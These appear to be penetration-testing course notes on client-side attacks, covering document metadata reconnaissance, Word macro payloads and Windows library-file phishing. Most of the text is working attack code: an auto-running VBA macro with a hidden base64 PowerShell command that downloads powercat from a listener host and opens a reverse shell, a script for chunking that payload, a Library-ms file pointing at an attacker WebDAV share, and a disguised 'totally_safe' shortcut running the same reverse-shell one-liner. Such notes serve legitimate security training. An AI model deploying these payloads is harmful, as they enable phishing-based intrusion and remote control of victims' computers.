# Module 11: Client-side Attacks

## Target Reconnaissance

### Information Gathering

One approach to information gathering without interacting with a target is to inspect the _metadata_ tags of publicly-available documents associate with the target organization. It _can_ be santizied, but often isn't. Documents found may be outdated as well. To do this, we can use the `exiftool` tool. Example: `exiftool -a -u file.pdf`

| Switch | Explanation             |
| ------ | ----------------------- |
| -a     | display duplicated tags |
| -u     | display unknown tags    |

We can also utilize google dorking with a search like `site:example.com filetype:pdf`.

If we are fine interacting with the target's website, we can use gobuster with the `-x` parameter to search for specific file extensions. Be aware, this is **noisy** and _will_ generate log entries on the target.

### Client Fingerprinting

Client Fingerprinting, also known as _Device Fingerprinting_ involves obtaining operating system and brownser information to determine what that device is.

[Canarytokens](https://canarytokens.org/nest) is a free web service that generates a link with an embedded token. This will gather information about the browser, IP address, and operating system when clicked.

There are some additional options like the online IP logger Grabify or JavaScript fingerprinting libraries such as fingerprint.js.

## Exploiting Microsoft Office

### Preparing the Attack

With Office macro attacks being so common, email providers and spam filter solutions often filter out all Microsoft Office documents by default. Additionally, most anti-phishing training programs stress the danger of enabling macros in an email Office document.

To provide an increase chance of the target opening our malicious document, pretext and other ways to access teh file are crucial. Examples being download links, Sharepoint/OneDrive share links, etc.

These files, if successfully sent to the targe twill be tagged with the _Mark of the Web_ (MOTW). Documents tagged with MOTW will open in _Protected View_, disabling all editing and modiification settings in the document and blocks macro execution or embedded objects. The user will also be presented with the SECURITY WARNING banner, with the option to Enable Content.

### Installing Microsoft Office

Nothing to add, it's installing Microsoft Office...

### Leveraging Microsoft Word Macros

Creating macros in Word: View > Macros. Make sure the file is saved as a .doc or .docm so the macros are persistent.

A new macro consists of an empty sub procedure containing several lines beginning with an apostrophe, which marks the start of a single-line comment in VBA.

```vba
Sub MyMacro()
'
' MyMacro Macro
'
'

End Sub
```

We'll be leveraging _ActiveX Objects_, which provide access to underlying operating system commands. This can be achieve with _WScript_ through the _Windows Script Host Shell object_. After instantiating a Windows Script Host Shell object with _CreateObject_, we can invoke the _Run_ method for _Wscript.Shell_ to launch an application. In this example, we'll start a PowerShell window.

```vba
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Office macros are not executed automatically, so we must use teh predefined _AutoOpen_ macro and _Document\_Open_ event.

```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Note: VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string in the example of a powercat reverse shell. This restriction **does not** apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.

```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str as String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

Now let's generate the base64'd powercat reverse listener: `echo -ne "IEX(New-Object System.Net.WebClient).DownloadString('http://your.listener.ip.here:port/powercat.ps1');powercat -c your.listener.ip.here -p port -e powershell" | base64` Run a simple python script to break it up into the multiple variables for the VBA script:

```python
str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk..."

n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Having now split the base64-encoded string into smaller chunks, we can update our macro:

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str as String
    Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY"
        Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5"
        Str = Str + "nKCdodHRwOi8veW91ci5saXN0ZW5lci5pcC5oZXJlOnBvcnQvc"
        Str = Str + "G93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgeW91ci5saXN0ZW5"
        Str = Str + "lci5pcC5oZXJlIC1wIHBvcnQgLWUgcG93ZXJzaGVsbA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

After that, start up a python3 web server in the directory hosting the powercat script and a netcast listener on the port you chose. Double clicking the document and enabling content will download powercat and execute the reverse listener. If you run into any issues with that like I did, take a look at using this python script from glowbase. [https://github.com/glowbase/macro\_reverse\_shell](https://github.com/glowbase/macro_reverse_shell). Additionally, if this will be running on a Windows device, ensure the command is UTF16LE (1200) encoded.

## Abusing Windows Library Files

### Obtaining Code Execution via Windows Library Files

For this section, we'll be utilizing a _WebDAV_ share to host the payload in the form of a **.lnk** shortcut file for executing a PowerShell reverse shell. The reason we'll be using the WebDAV share and the **.Library-ms** library file is because a majority of spam filters and security technologies will pass Windows library files directly to the user. After opening it, the user will be taken to our malicious .lnk file.

First, we'll install WsgiDAV with **pip3**. `pip3 install wsgidav` If the installation of WsgiDAV fails with **error: externally-managed-environment**, we can use a virtual environment or install the package _python3-wsgidav_ with apt.

Next we'll run WsgiDAV from the **/home/kali/.local/bin** directory.

```bash
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

| Switch | Explanation                                    |
| ------ | ---------------------------------------------- |
| --host | Specifies the host to server from              |
| --port | The port to listen on                          |
| --auth | disable authentication when set to anonymous   |
| --root | Setting the root directory of the WebDAV share |

Library files consist of three major parts and are written in XML to specify parameters for accessing remote locations.

1. _General library information_
2. _Library properties_
3. _Library Description Schema_

Start by creating a new file named **config.Library-ms**. Important Tags and their use will be covered in each code sample section: The namespace for the library file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
```

The _name_ tag: Specifies the name of the library. Examples: _@shell32.dll,-34575_ or _@windows.storage.dll,-34582_. The _version_ tag: Any numerical value.

```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```

The _isLibraryPinned_ tag: specifies if the library is pinned to the navigation pane in Windows Explorer. This may make it appear more genuine if set to **true**. The _iconReference_: determines what icon is used.

```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
```

The _templateInfo_ and _folderType_ tags: These determine columns and details that appear in Windows Explorer. A GUID must be specified. The example will use the **Documents** GUID.

```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```

The _searchConnectorDescriptionList_ tag: Contains a list of _search connectors_ defined by _searchConnectorDescription_. These are used by library files to specify the connection settings. The _isDefaultSaveLocation_ tag: Determines the behavior of Windows Explorer when a user chooses to save an item. Default behavior is a value of **true**. The _isSupported_ tag: Used for compatability -- not documented in the Microsoft Documentation webpage. The _url_ tag: Points to the remote location. The _simpleLocation_ tags: contain the _url_ tag. Can specify the remote location in a more user-friendly way as the normal _locationProvider_ element.

```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://your.listener.ip.here:port</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```

Final code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://your.listener.ip.here:port</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Creating the malicious .lnk:

1. Create Shortcut
2. Set the location to `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://your.listener.ip.here:port/powercat.ps1'); powercat -c your.listener.ip.here -p port -e powershell"`
3. Name it `totally_safe`.
4. Click Finish
